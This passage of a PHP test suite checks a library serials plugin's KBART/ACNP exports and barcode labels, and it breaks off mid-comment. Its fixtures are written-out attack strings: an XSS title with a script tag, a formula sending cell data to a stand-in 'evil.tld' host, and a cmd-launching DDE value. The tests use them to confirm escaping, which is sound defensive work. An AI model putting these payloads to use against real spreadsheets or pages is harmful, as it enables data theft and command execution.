<?php
declare(strict_types=1);

/**
 * Behavioral unit tests for the Emeroteca union-catalogue exports and the
 * per-issue labels (issue #140 review follow-up).
 *
 * Runs against the REAL dev DB with real fixtures — the compaction rules and
 * the coverage bounds are only meaningful against real rows, and a pure
 * string test would prove nothing about the SQL.
 *
 * Covers:
 *   1. KbartExporter::KBART_COLUMNS is the exact 25-column NISO RP-9-2014
 *      header, in the canonical order, and the emitted header line matches;
 *   2. the exported row carries the normalized ISSN / e-ISSN in
 *      print_identifier / online_identifier and the joined publisher name;
 *   3. coverage = first/last annata that actually owns something, with the
 *      volume and the first/last owned issue designation;
 *   4. publication_type / coverage_depth / access_type / title_id /
 *      preceding_publication_title_id follow the documented policy;
 *   5. NO value contains a TAB or a newline — a stray TAB would shift every
 *      later column of the row into the wrong field;
 *   6. consistenzaAnnata() produces exactly "1-8, 10-12; lac. 9", appends the
 *      non-numeric designations verbatim, and APPENDS a curator-written
 *      consistenza_dichiarata after ' · ' instead of replacing the computed
 *      statement (canonical rule, identical to consistenzaTestata) — the
 *      exported holdings must keep the issues really on the shelf;
 *   7. atteso / reclamato / scartato / smarrito count neither as owned nor as
 *      a gap;
 *   8. the ACNP CSV row is a single physical line with RFC 4180 quoting and
 *      the per-year holdings statement;
 *   9. labels: the PDF is non-empty and really is a PDF, the issue's own
 *      barcode wins over the title's barcode_base, an issue without either
 *      still gets a label, and the HTML sheet escapes a title carrying
 *      `"><script>` (no executable markup reaches the page);
 *  10. spreadsheet formula injection: a value starting with '=', '+', '-' or
 *      '@' is neutralized with a leading apostrophe in BOTH files, while the
 *      header line stays byte-identical (its spelling is the KBART contract);
 *  11. an ISSN that fails its mod-11 checksum is NOT emitted — formatting it
 *      would hand the union catalogue a well-formed ISSN belonging to another
 *      journal;
 *  12. an issue with an empty `numero` is counted (marker "s.n."), aligning
 *      the export with consistenzaTestata() instead of silently declaring the
 *      annata empty;
 *  13. a title carrying an invalid UTF-8 byte still exports its name (the /u
 *      modifier used to blank the whole cell);
 *  14. scan lookup: a code matching MORE THAN ONE issue answers 'ambiguous'
 *      and resolves to the testata instead of picking a row, while ?testata=
 *      narrows legitimately to a unique match;
 *  15. labels: a selection belonging to another testata is reported as an
 *      invalid selection, not as "nothing selected".
 *
 * Conventions follow tests/emeroteca-schema-140.unit.php: env parsing, socket
 * connection, check()/pass() helpers, zz_ fixtures, FK-ordered cleanup, hard
 * failure (exit 1) when the DB is unreachable.
 *
 * Run:
 *   php tests/emeroteca-export-140.unit.php
 */

require __DIR__ . '/../vendor/autoload.php';

function emuexp_env(string $path): array
{
    $env = [];
    foreach (@file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [] as $line) {
        if ($line === '' || $line[0] === '#' || !str_contains($line, '=')) {
            continue;
        }
        [$k, $v] = explode('=', $line, 2);
        $k = trim($k);
        $v = trim($v);
        if (strlen($v) >= 2 && ($v[0] === '"' || $v[0] === "'") && $v[-1] === $v[0]) {
            $v = substr($v, 1, -1);
        }
        $env[$k] = $v;
    }
    return $env;
}

$env    = emuexp_env(__DIR__ . '/../.env');
$socket = getenv('E2E_DB_SOCKET') ?: ($env['DB_SOCKET'] ?? '/opt/homebrew/var/mysql/mysql.sock');
$user   = getenv('E2E_DB_USER') ?: ($env['DB_USER'] ?? '');
$pass   = getenv('E2E_DB_PASS') ?: ($env['DB_PASS'] ?? ($env['DB_PASSWORD'] ?? ''));
$name   = getenv('E2E_DB_NAME') ?: ($env['DB_NAME'] ?? '');

mysqli_report(MYSQLI_REPORT_OFF);
try {
    $db = (is_string($socket) && $socket !== '' && file_exists($socket))
        ? @new mysqli(null, $user, $pass, $name, 0, $socket)
        : @new mysqli($env['DB_HOST'] ?? '127.0.0.1', $user, $pass, $name, (int) ($env['DB_PORT'] ?? 3306));
} catch (\Throwable $e) {
    fwrite(STDERR, "FAIL: database not reachable (" . $e->getMessage() . ") — this suite requires the real DB\n");
    exit(1);
}
if (!isset($db) || $db->connect_errno !== 0) {
    $error = isset($db) ? $db->connect_error : 'connection failed';
    fwrite(STDERR, "FAIL: database not reachable ({$error}) — this suite requires the real DB\n");
    exit(1);
}
$db->set_charset('utf8mb4');

$TESTNO = 0;
function pass(string $desc): void
{
    global $TESTNO;
    $TESTNO++;
    printf("[%02d] PASS: %s\n", $TESTNO, $desc);
}
function check(bool $cond, string $desc): void
{
    if (!$cond) {
        throw new \RuntimeException("assertion failed: {$desc}");
    }
    pass($desc);
}

$pluginDir  = __DIR__ . '/../storage/plugins/emeroteca';
$supportDir = $pluginDir . '/src/Support';
require_once $supportDir . '/IssnHelper.php';
require_once $supportDir . '/KbartExporter.php';
require_once $supportDir . '/IssueLabelRenderer.php';
// The scan-lookup and label ROUTES are exercised through the real controller
// (sections 14-15): an ambiguous barcode is a controller decision.
require_once $pluginDir . '/EmerotecaPlugin.php';
require_once $pluginDir . '/src/Controllers/ExportAdminController.php';

use App\Plugins\Emeroteca\Controllers\ExportAdminController;
use App\Plugins\Emeroteca\Support\IssnHelper;
use App\Plugins\Emeroteca\Support\IssueLabelRenderer;
use App\Plugins\Emeroteca\Support\KbartExporter;
use App\Support\HookManager;
use App\Support\Hooks;

// Flash helpers write to $_SESSION; in CLI initialize it explicitly.
$_SESSION = [];

// Real HookManager marked "runtime-loaded" so the DB-registered plugin hooks
// are NOT pulled in: this suite wires only what it exercises.
$hookManager = new HookManager($db);
$hookManager->setPluginsLoadedRuntime();
Hooks::init($hookManager);

// ── fixtures ─────────────────────────────────────────────────────────
$RUN = 'zz_emuexp_' . bin2hex(random_bytes(4));
$TITLE_MAIN   = "zz_Rivista Export {$RUN}";
$TITLE_PREV   = "zz_Rivista Precedente {$RUN}";
$TITLE_XSS    = "zz_XSS {$RUN} \"><script>alert(1)</script>";
// Starts with '=': Excel/LibreOffice evaluate such a cell as a formula.
$TITLE_FORMULA = '=HYPERLINK("https://evil.tld/?d="&A2,"Apri") zz_Formula ' . $RUN;
// Legacy ISSN with a WRONG mod-11 check digit: 1234567 checks to '9', not '8'.
$TITLE_BADISSN = "zz_ISSN Errato {$RUN}";
$PUBLISHER    = "zz_Editore Export {$RUN}";
// Real, checksum-valid ISSNs (0378-5955 is the ISO 3297 textbook example).
$ISSN  = '0378-5955';
$EISSN = '1476-4687';

$cleanup = static function () use (
    $db,
    $TITLE_MAIN,
    $TITLE_PREV,
    $TITLE_XSS,
    $TITLE_FORMULA,
    $TITLE_BADISSN,
    $PUBLISHER
): void {
    $titles = implode(',', array_map(
        static fn (string $t): string => "'" . $db->real_escape_string($t) . "'",
        [$TITLE_MAIN, $TITLE_PREV, $TITLE_XSS, $TITLE_FORMULA, $TITLE_BADISSN]
    ));
    @$db->query(
        "DELETE ar FROM emeroteca_articoli ar
           JOIN emeroteca_fascicoli f ON ar.fascicolo_id = f.id
           JOIN emeroteca_annate a ON f.annata_id = a.id
           JOIN emeroteca_testate t ON a.testata_id = t.id
          WHERE t.titolo IN ({$titles})"
    );
    @$db->query(
        "DELETE f FROM emeroteca_fascicoli f
           JOIN emeroteca_annate a ON f.annata_id = a.id
           JOIN emeroteca_testate t ON a.testata_id = t.id
          WHERE t.titolo IN ({$titles})"
    );
    @$db->query(
        "DELETE a FROM emeroteca_annate a
           JOIN emeroteca_testate t ON a.testata_id = t.id
          WHERE t.titolo IN ({$titles})"
    );
    // testata_precedente_id is ON DELETE SET NULL, so order is irrelevant here.
    @$db->query("DELETE FROM emeroteca_testate WHERE titolo IN ({$titles})");
    @$db->query("DELETE FROM editori WHERE nome = '" . $db->real_escape_string($PUBLISHER) . "'");
};
$cleanup();

/** @return int inserted id */
$exec = static function (string $sql, string $types, array $params) use ($db): int {
    $stmt = $db->prepare($sql);
    if ($stmt === false) {
        throw new \RuntimeException('prepare failed: ' . $db->error . ' — ' . $sql);
    }
    if ($types !== '') {
        $stmt->bind_param($types, ...$params);
    }
    if (!$stmt->execute()) {
        $err = $stmt->error;
        $stmt->close();
        throw new \RuntimeException('execute failed: ' . $err . ' — ' . $sql);
    }
    $id = (int) $db->insert_id;
    $stmt->close();
    return $id;
};

try {
    // ── 0. seed ───────────────────────────────────────────────────────
    $editoreId = $exec('INSERT INTO editori (nome) VALUES (?)', 's', [$PUBLISHER]);
    check($editoreId > 0, 'fixture: publisher inserted');

    $prevId = $exec(
        "INSERT INTO emeroteca_testate (titolo, tipo) VALUES (?, 'rivista')",
        's',
        [$TITLE_PREV]
    );
    check($prevId > 0, 'fixture: preceding title inserted');

    $testataId = $exec(
        "INSERT INTO emeroteca_testate
            (titolo, issn, e_issn, editore_id, luogo_pubblicazione, periodicita, tipo,
             testata_precedente_id, barcode_base)
         VALUES (?, ?, ?, ?, ?, 'mensile', 'rivista', ?, ?)",
        'sssisis',
        [
            $TITLE_MAIN,
            $ISSN,
            $EISSN,
            $editoreId,
            'Padova, Italia',
            $prevId,
            (string) IssnHelper::barcodeBase($ISSN),
        ]
    );
    check($testataId > 0, 'fixture: main title inserted');

    // Annata 1998 → owned 1-8 and 10-12, gap 9, plus an expected and a
    // withdrawn issue that must influence neither side of the statement.
    $annata1998 = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 1998, '1')",
        'i',
        [$testataId]
    );
    $insertFascicolo = static function (
        int $annataId,
        string $numero,
        string $stato,
        ?string $barcode = null,
        ?string $inventario = null,
        ?string $dataCopertina = null
    ) use ($exec): int {
        return $exec(
            'INSERT INTO emeroteca_fascicoli (annata_id, numero, stato, barcode, numero_inventario, data_copertina)
             VALUES (?, ?, ?, ?, ?, ?)',
            'isssss',
            [$annataId, $numero, $stato, $barcode, $inventario, $dataCopertina]
        );
    };

    $firstIssueId = 0;
    foreach ([1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12] as $n) {
        $id = $insertFascicolo($annata1998, (string) $n, 'posseduto');
        if ($n === 1) {
            $firstIssueId = $id;
        }
    }
    $insertFascicolo($annata1998, '9', 'mancante');
    $insertFascicolo($annata1998, '13', 'atteso');
    $insertFascicolo($annata1998, '14', 'scartato');
    $insertFascicolo($annata1998, '15', 'reclamato');
    $insertFascicolo($annata1998, '16', 'smarrito');
    check($firstIssueId > 0, 'fixture: 1998 issues seeded (owned/gap/atteso/scartato/reclamato/smarrito)');

    // Annata 1999 → a numeric issue plus a non-numeric designation and a
    // non-numeric gap, to exercise the verbatim tail on both sides.
    $annata1999 = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 1999, '2')",
        'i',
        [$testataId]
    );
    // 977 + the 7 ISSN digits + issue variant "01" + a VALID GS1 check digit:
    // an EAN with a wrong check digit is rejected by TCPDF's encoder.
    $ownBarcode = '9770378595019';
    $ownBarcodeIssue = $insertFascicolo($annata1999, '1', 'posseduto', $ownBarcode, 'INV-1999-1', 'Gennaio 1999');
    $doubleIssue     = $insertFascicolo($annata1999, '13-14', 'posseduto', null, 'INV-1999-1314', 'Estate 1999');
    $insertFascicolo($annata1999, 'S1', 'mancante');
    check($ownBarcodeIssue > 0 && $doubleIssue > 0, 'fixture: 1999 issues seeded (numeric + "13-14" + non-numeric gap)');

    // ── 1. KBART header ───────────────────────────────────────────────
    $expectedColumns = [
        'publication_title', 'print_identifier', 'online_identifier',
        'date_first_issue_online', 'num_first_vol_online', 'num_first_issue_online',
        'date_last_issue_online', 'num_last_vol_online', 'num_last_issue_online',
        'title_url', 'first_author', 'title_id', 'embargo_info', 'coverage_depth',
        'notes', 'publisher_name', 'publication_type',
        'date_monograph_published_print', 'date_monograph_published_online',
        'monograph_volume', 'monograph_edition', 'first_editor',
        'parent_publication_title_id', 'preceding_publication_title_id', 'access_type',
    ];
    check(count($expectedColumns) === 25, 'the KBART contract is 25 columns');
    check(
        KbartExporter::KBART_COLUMNS === $expectedColumns,
        'KBART_COLUMNS matches NISO RP-9-2014 exactly, order included'
    );

    $tsv = KbartExporter::kbart($db, $testataId);
    $lines = explode("\n", rtrim($tsv, "\n"));
    check(
        $lines[0] === implode("\t", $expectedColumns),
        'emitted header line is the 25 canonical columns, TAB-separated'
    );
    check(substr($tsv, 0, 3) !== "\xEF\xBB\xBF", 'no UTF-8 BOM (would corrupt the first header cell)');
    check(!str_contains($tsv, "\r"), 'newline is "\\n", never CRLF');
    check(count($lines) === 2, 'scoped export emits exactly one data row');

    // ── 2-4. row content ──────────────────────────────────────────────
    $cells = explode("\t", $lines[1]);
    check(count($cells) === 25, 'the data row has exactly 25 fields');
    $row = array_combine($expectedColumns, $cells);

    check($row['publication_title'] === $TITLE_MAIN, 'publication_title is the title');
    check($row['print_identifier'] === $ISSN, "print_identifier is the normalized ISSN ({$ISSN})");
    check($row['online_identifier'] === $EISSN, "online_identifier is the normalized e-ISSN ({$EISSN})");
    check($row['publisher_name'] === $PUBLISHER, 'publisher_name comes from the joined editori row');
    check($row['publication_type'] === 'serial', "publication_type is 'serial'");

    check($row['date_first_issue_online'] === '1998', 'coverage starts at the first annata owning something');
    check($row['num_first_vol_online'] === '1', 'num_first_vol_online is the first owned annata volume');
    check($row['num_first_issue_online'] === '1', 'num_first_issue_online is the lowest owned issue');
    check($row['date_last_issue_online'] === '1999', 'coverage ends at the last annata owning something');
    check($row['num_last_vol_online'] === '2', 'num_last_vol_online is the last owned annata volume');
    check(
        $row['num_last_issue_online'] === '13-14',
        'num_last_issue_online naturally orders "13-14" after "1" (got "' . $row['num_last_issue_online'] . '")'
    );

    check($row['title_id'] === 'emeroteca:' . $testataId, 'title_id is the stable local identifier');
    check(
        $row['preceding_publication_title_id'] === 'emeroteca:' . $prevId,
        'preceding_publication_title_id references the preceding title with the same scheme'
    );
    check($row['parent_publication_title_id'] === '', 'parent_publication_title_id is empty for a serial');
    check(
        $row['coverage_depth'] === 'print',
        "coverage_depth is 'print' without public PDFs (got '" . $row['coverage_depth'] . "')"
    );
    check($row['access_type'] === '', 'access_type is left empty for print-only holdings');
    check(str_ends_with($row['title_url'], '/emeroteca/' . $testataId), 'title_url points at the public title page');
    check($row['embargo_info'] === '' && $row['first_author'] === '' && $row['first_editor'] === '', 'unused KBART fields are empty, not filler');
    check(
        $row['date_monograph_published_print'] === '' && $row['monograph_volume'] === '' && $row['monograph_edition'] === '',
        'monograph-only fields stay empty on a serial row'
    );

    // ── 5. no TAB / newline inside a value ────────────────────────────
    $dirty = false;
    foreach ($cells as $cell) {
        if (preg_match('/[\t\r\n]/', $cell) === 1) {
            $dirty = true;
        }
    }
    check(!$dirty, 'no field contains a TAB or a newline');

    // A title carrying literal TABs and newlines must not break the grid.
    $xssId = $exec(
        "INSERT INTO emeroteca_testate (titolo, tipo) VALUES (?, 'rivista')",
        's',
        ["{$TITLE_XSS}"]
    );
    $updDirty = $db->prepare('UPDATE emeroteca_testate SET luogo_pubblicazione = ? WHERE id = ?');
    check($updDirty !== false, 'dirty-value fixture: update prepared');
    $dirtyPlace = "Riga1\tcolonna2\nRiga2";
    $updDirty->bind_param('si', $dirtyPlace, $xssId);
    check($updDirty->execute(), 'dirty-value fixture: TAB+newline written to the DB');
    $updDirty->close();

    $tsvDirty = KbartExporter::kbart($db, $xssId);
    $dirtyLines = explode("\n", rtrim($tsvDirty, "\n"));
    check(count($dirtyLines) === 2, 'a value containing a newline still produces exactly one data row');
    check(count(explode("\t", $dirtyLines[1])) === 25, 'a value containing a TAB still produces exactly 25 fields');

    // ── 6-7. consistenzaAnnata ────────────────────────────────────────
    $cons1998 = KbartExporter::consistenzaAnnata($db, $annata1998);
    check(
        $cons1998 === '1-8, 10-12; lac. 9',
        "consistenzaAnnata compacts runs and lists gaps: expected '1-8, 10-12; lac. 9', got '{$cons1998}'"
    );
    pass('atteso / reclamato / scartato / smarrito count neither as owned nor as a gap (implied by the exact string above)');

    $cons1999 = KbartExporter::consistenzaAnnata($db, $annata1999);
    check(
        $cons1999 === '1, 13-14; lac. S1',
        "non-numeric designations are listed verbatim in the tail: expected '1, 13-14; lac. S1', got '{$cons1999}'"
    );

    $declared = 'annata rilegata, completa';
    $updDecl = $db->prepare('UPDATE emeroteca_annate SET consistenza_dichiarata = ? WHERE id = ?');
    check($updDecl !== false, 'declared-consistency fixture: update prepared');
    $updDecl->bind_param('si', $declared, $annata1998);
    check($updDecl->execute(), 'declared-consistency fixture: consistenza_dichiarata written');
    $updDecl->close();

    // CANONICAL RULE: the declared statement is APPENDED after ' · ', it does
    // NOT replace the computed one. Substituting it dropped every issue really
    // owned in that annata from the file the union catalogue ingests.
    $withDeclared = KbartExporter::consistenzaAnnata($db, $annata1998);
    check(
        $withDeclared === '1-8, 10-12; lac. 9 · ' . $declared,
        "consistenza_dichiarata is APPENDED to the computed statement, separated by ' · ' (got '{$withDeclared}')"
    );
    check(
        str_contains($withDeclared, '1-8, 10-12') && str_contains($withDeclared, 'lac. 9'),
        'the really-owned issues and the gaps survive a valorized consistenza_dichiarata'
    );

    // Same rule inside the export itself: the KBART notes cell must carry the
    // owned issues AND the declared statement for that year.
    $tsvDeclared = KbartExporter::kbart($db, $testataId);
    $declaredCells = explode("\t", explode("\n", rtrim($tsvDeclared, "\n"))[1]);
    $declaredNotes = $declaredCells[array_search('notes', $expectedColumns, true)];
    check(
        str_contains($declaredNotes, '1998: 1-8, 10-12; lac. 9 · ' . $declared),
        'the exported notes carry BOTH the computed holdings and the declared statement (got: ' . $declaredNotes . ')'
    );

    // A declared statement with no computed holdings stands alone.
    $declOnlyAnnata = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume, consistenza_dichiarata)
         VALUES (?, 1997, '0', 'raccolta lacunosa non inventariata')",
        'i',
        [$testataId]
    );
    check(
        KbartExporter::consistenzaAnnata($db, $declOnlyAnnata) === 'raccolta lacunosa non inventariata',
        'an annata with no issues renders the declared statement alone'
    );

    // Nothing at all → the same '—' sentinel consistenzaTestata() uses.
    $emptyAnnata = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 1996, '0')",
        'i',
        [$testataId]
    );
    check(
        KbartExporter::consistenzaAnnata($db, $emptyAnnata) === '—',
        "an annata with neither holdings nor a declared statement renders the '—' sentinel"
    );
    @$db->query('DELETE FROM emeroteca_annate WHERE id IN (' . $declOnlyAnnata . ',' . $emptyAnnata . ')');

    // Restore the computed statement for the ACNP assertions below.
    $clearDecl = $db->prepare('UPDATE emeroteca_annate SET consistenza_dichiarata = NULL WHERE id = ?');
    check($clearDecl !== false, 'declared-consistency fixture: clear prepared');
    $clearDecl->bind_param('i', $annata1998);
    check($clearDecl->execute(), 'declared-consistency fixture: consistenza_dichiarata cleared');
    $clearDecl->close();
    check(
        KbartExporter::consistenzaAnnata($db, $annata1998) === '1-8, 10-12; lac. 9',
        'clearing consistenza_dichiarata restores the computed statement'
    );

    // ── 8. ACNP CSV ───────────────────────────────────────────────────
    $csv = KbartExporter::acnp($db, $testataId);
    $csvLines = explode("\n", rtrim($csv, "\n"));
    check(substr($csv, 0, 3) !== "\xEF\xBB\xBF", 'ACNP CSV has no UTF-8 BOM either');
    check(count($csvLines) === 2, 'ACNP export is header + one row per title');
    check(
        $csvLines[0] === implode(',', KbartExporter::ACNP_COLUMNS),
        'ACNP header lists the declared columns'
    );
    // The consistenza cell contains commas and must therefore be quoted.
    check(
        str_contains($csvLines[1], '"1998: 1-8, 10-12; lac. 9 | 1999: 1, 13-14; lac. S1"'),
        'ACNP row carries the per-year holdings statement, RFC 4180 quoted (got: ' . $csvLines[1] . ')'
    );
    check(str_contains($csvLines[1], $ISSN), 'ACNP row carries the ISSN');
    check(str_contains($csvLines[1], $PUBLISHER), 'ACNP row carries the publisher');

    // A title whose name contains a double quote must be escaped by doubling.
    $csvXss = KbartExporter::acnp($db, $xssId);
    $csvXssLines = explode("\n", rtrim($csvXss, "\n"));
    check(count($csvXssLines) === 2, 'a quote-bearing title still yields one CSV row');
    check(
        str_contains($csvXssLines[1], '""><script>'),
        'a double quote inside a CSV cell is escaped by doubling'
    );

    // ── 9. labels ─────────────────────────────────────────────────────
    $pdf = IssueLabelRenderer::labelsPdf($db, [$ownBarcodeIssue, $doubleIssue, $firstIssueId]);
    check($pdf !== '', 'label PDF is not empty');
    check(str_starts_with($pdf, '%PDF-'), 'label PDF really is a PDF (magic bytes)');
    check(strlen($pdf) > 2000, 'label PDF carries actual content (' . strlen($pdf) . ' bytes)');
    check(IssueLabelRenderer::labelsPdf($db, []) === '', 'no issue ids → empty PDF, no exception');

    // "Non-empty PDF" proves nothing about what is printed: inspect the bytes
    // with poppler and assert the fields really landed on the sheet.
    $poppler = trim((string) @shell_exec('command -v pdftotext 2>/dev/null')) !== ''
        && trim((string) @shell_exec('command -v pdfinfo 2>/dev/null')) !== '';
    if ($poppler) {
        $pdfPath = sys_get_temp_dir() . '/emeroteca-labels-' . getmypid() . '.pdf';
        file_put_contents($pdfPath, $pdf);
        $info = (string) @shell_exec('pdfinfo ' . escapeshellarg($pdfPath) . ' 2>/dev/null');
        $text = (string) @shell_exec('pdftotext ' . escapeshellarg($pdfPath) . ' - 2>/dev/null');
        @unlink($pdfPath);

        check(str_contains($info, '(A4)'), 'the label sheet is an A4 page, not a label-sized one');
        // pdftotext can break a long line mid-word, so match on fragments that
        // survive wrapping rather than on whole strings.
        check(str_contains($text, '1998') && str_contains($text, '1999'), 'the printed labels carry the annata years');
        check(str_contains($text, $ownBarcode), "the issue's own barcode is printed under the bars");
        check(str_contains($text, 'INV-1999-1'), 'the printed labels carry the inventory number');
        check(str_contains($text, 'Estate 1999'), 'the printed labels carry the free-text cover date');
    } else {
        $TESTNO++;
        printf("[%02d] SKIP: poppler (pdftotext/pdfinfo) missing — PDF CONTENT was NOT verified\n", $TESTNO);
    }

    $html = IssueLabelRenderer::labelsHtml($db, [$ownBarcodeIssue, $doubleIssue, $firstIssueId]);
    check($html !== '', 'label HTML is not empty');
    check(substr_count($html, 'class="emeroteca-label"') === 3, 'one label per requested issue');
    check(str_contains($html, '@page { size: A4;'), 'the printable sheet declares an A4 page');

    // The issue with its own barcode prints THAT code…
    check(str_contains($html, $ownBarcode), "the issue's own barcode is printed when present");
    // …and the one without falls back to the title's ISSN-derived base.
    $base = (string) IssnHelper::barcodeBase($ISSN);
    check($base !== '', 'fixture: the ISSN yields a 977 barcode base');
    check(str_contains($html, $base), "an issue without its own barcode falls back to the title's barcode_base");
    check(substr_count($html, '<svg') === 3, 'every label renders a barcode symbol as inline SVG');

    // An issue with neither barcode nor barcode_base still gets a label.
    $noBarcodeAnnata = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 2000, '1')",
        'i',
        [$xssId]
    );
    $noBarcodeIssue = $insertFascicolo($noBarcodeAnnata, '1', 'posseduto', null, 'INV-2000-1', 'Gennaio 2000');
    $htmlNoBarcode = IssueLabelRenderer::labelsHtml($db, [$noBarcodeIssue]);
    check(
        substr_count($htmlNoBarcode, 'class="emeroteca-label"') === 1,
        'an issue with no barcode at all still produces a label'
    );
    check(!str_contains($htmlNoBarcode, '<svg'), 'that label simply carries no barcode symbol');
    check(str_contains($htmlNoBarcode, 'INV-2000-1'), 'the label still carries the inventory number');
    check(
        IssueLabelRenderer::labelsPdf($db, [$noBarcodeIssue]) !== '',
        'the barcode-less issue also renders as a PDF'
    );

    // XSS: the title carries `"><script>alert(1)</script>`.
    check(
        !str_contains($htmlNoBarcode, '<script>'),
        'no executable <script> reaches the printable sheet'
    );
    check(
        str_contains($htmlNoBarcode, '&lt;script&gt;') || str_contains($htmlNoBarcode, '&quot;&gt;&lt;script&gt;'),
        'the hostile title is HTML-escaped instead'
    );
    check(
        !str_contains($htmlNoBarcode, '"><script'),
        'the attribute-breakout sequence never appears verbatim'
    );

    check(
        IssueLabelRenderer::labelsHtml($db, []) !== '' && str_contains(IssueLabelRenderer::labelsHtml($db, []), '</html>'),
        'an empty selection still returns a well-formed (empty-state) sheet'
    );

    // ── 10. Spreadsheet formula injection ─────────────────────────────
    // RFC 4180 quoting does NOT stop Excel/LibreOffice from evaluating a cell
    // that starts with '=', '+', '-' or '@'. Both files are opened by the
    // operator of the union catalogue, so both must neutralize it.
    $formulaId = $exec(
        "INSERT INTO emeroteca_testate (titolo, tipo, luogo_pubblicazione) VALUES (?, 'rivista', ?)",
        'ss',
        [$TITLE_FORMULA, '@SUM(1+1)*cmd|\' /C calc\'!A0']
    );
    check($formulaId > 0, 'formula fixture: hostile title and place inserted');

    $tsvFormula = KbartExporter::kbart($db, $formulaId);
    $formulaLines = explode("\n", rtrim($tsvFormula, "\n"));
    check(
        $formulaLines[0] === implode("\t", $expectedColumns),
        'the KBART header is NEVER prefixed: its spelling is the contract'
    );
    $formulaCells = explode("\t", $formulaLines[1]);
    check(
        str_starts_with($formulaCells[0], "'="),
        'a KBART data cell starting with "=" is neutralized with a leading apostrophe (got: '
            . substr($formulaCells[0], 0, 20) . ')'
    );
    check(
        !str_starts_with($formulaCells[0], '='),
        'no KBART data cell reaches the spreadsheet as a live formula'
    );

    $csvFormula = KbartExporter::acnp($db, $formulaId);
    $csvFormulaLines = explode("\n", rtrim($csvFormula, "\n"));
    check(
        $csvFormulaLines[0] === implode(',', KbartExporter::ACNP_COLUMNS),
        'the ACNP header is NEVER prefixed either'
    );
    // titolo is the first cell; it contains commas so RFC 4180 quotes it, and
    // the apostrophe must sit INSIDE the quotes, before the '='.
    check(
        str_starts_with($csvFormulaLines[1], '"\'=') || str_starts_with($csvFormulaLines[1], "'="),
        'an ACNP data cell starting with "=" is neutralized too (got: '
            . substr($csvFormulaLines[1], 0, 20) . ')'
    );
    check(
        str_contains($csvFormulaLines[1], ",'@SUM(1+1)") || str_contains($csvFormulaLines[1], '"\'@SUM(1+1)'),
        'the "@" lead-in of luogo_pubblicazione is neutralized as well (got: ' . $csvFormulaLines[1] . ')'
    );
    check(
        !str_contains($csvFormula, ',=HYPERLINK') && !str_contains($csvFormula, ',@SUM'),
        'no ACNP data cell reaches the spreadsheet as a live formula'
    );

    // ── 11. ISSN checksum ─────────────────────────────────────────────
    // "12345678" is well FORMED but its mod-11 check digit is wrong (9, not
    // 8). Formatting it produced "1234-5678" — a real ISSN, of a DIFFERENT
    // journal: the knowledge base would bind these holdings to someone else.
    check(
        IssnHelper::isValidFormat('12345678') && !IssnHelper::isValidChecksum('12345678'),
        'fixture: "12345678" is structurally valid but fails its checksum'
    );
    $badIssnId = $exec(
        "INSERT INTO emeroteca_testate (titolo, tipo, issn, e_issn) VALUES (?, 'rivista', ?, ?)",
        'sss',
        [$TITLE_BADISSN, '12345678', $EISSN]
    );
    $tsvBad = KbartExporter::kbart($db, $badIssnId);
    $badCells = explode("\t", explode("\n", rtrim($tsvBad, "\n"))[1]);
    $badRow = array_combine($expectedColumns, $badCells);
    check(
        $badRow['print_identifier'] === '',
        "an ISSN failing its checksum is NOT emitted (got '" . $badRow['print_identifier'] . "')"
    );
    check(
        !str_contains($tsvBad, '1234-5678'),
        'the wrong ISSN never appears hyphenated as somebody else\'s identifier'
    );
    check(
        $badRow['online_identifier'] === $EISSN,
        'a VALID identifier on the same row is still emitted (no over-blocking)'
    );

    // ── 12. Unnumbered issues ─────────────────────────────────────────
    // consistenzaTestata() counts an issue whose `numero` is '' — the export
    // used to skip it, so an annata holding only unnumbered issues looked
    // empty in the file the union catalogue ingests.
    $unnumberedAnnata = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 2003, '4')",
        'i',
        [$xssId]
    );
    $insertFascicolo($unnumberedAnnata, '', 'posseduto', null, 'INV-2003-SN', null);
    $unnumbered = KbartExporter::consistenzaAnnata($db, $unnumberedAnnata);
    check(
        $unnumbered === 's.n.',
        "an owned issue with an empty numero is counted as 's.n.', not dropped (got '{$unnumbered}')"
    );
    check(
        $unnumbered !== '—' && $unnumbered !== '',
        'an annata holding only unnumbered issues is never declared empty'
    );
    $tsvUnnumbered = KbartExporter::kbart($db, $xssId);
    $unnCells = explode("\t", explode("\n", rtrim($tsvUnnumbered, "\n"))[1]);
    $unnRow = array_combine($expectedColumns, $unnCells);
    check(
        str_contains($unnRow['notes'], '2003: s.n.'),
        'the unnumbered holdings reach the exported notes (got: ' . $unnRow['notes'] . ')'
    );
    check(
        $unnRow['date_last_issue_online'] === '2003',
        'an unnumbered owned issue extends the declared coverage like any other'
    );

    // ── 13. Invalid UTF-8 must not blank a cell ───────────────────────
    // preg_replace('/…/u') returns NULL on invalid UTF-8 and (string) null is
    // '': one latin-1 byte in a legacy title silently emptied publication_title.
    //
    // A utf8mb4 column refuses the byte outright, so the fixture cannot come
    // from the DB: the sanitizer is exercised directly. It is a pure function
    // and this is exactly the input that used to destroy the cell — a value
    // reaching the exporter from a hook, an import or a legacy dump.
    $oneLine = new \ReflectionMethod(KbartExporter::class, 'oneLine');
    $oneLine->setAccessible(true);
    $latin1Title = "zz_Latin1 \xE8 rivista";
    check(
        preg_match('//u', $latin1Title) !== 1,
        'fixture: the value really is invalid UTF-8 (this is what returned NULL)'
    );
    $cleaned = (string) $oneLine->invoke(null, $latin1Title);
    check(
        $cleaned !== '' && str_contains($cleaned, 'zz_Latin1') && str_contains($cleaned, 'rivista'),
        'an invalid UTF-8 byte no longer blanks the whole cell (got: ' . bin2hex($cleaned) . ')'
    );
    check(
        (string) $oneLine->invoke(null, "a\tb\nc") === 'a b c',
        'the control-character collapse still works without the /u modifier'
    );

    // ── 13b. Degraded install: optional core tables ───────────────────
    // The plugin declares it tolerates installs without `editori` /
    // `mensole` / `scaffali` (AbstractAdminController::tableExists,
    // PublicController::fascicolo). An unconditional JOIN there made the
    // whole statement fail and the export answered 200 with a HEADER-ONLY
    // file — which the operator uploads to the union catalogue as their
    // holdings. The probe result is forced here instead of renaming core
    // tables on the shared dev database: the cache IS the probe, so the
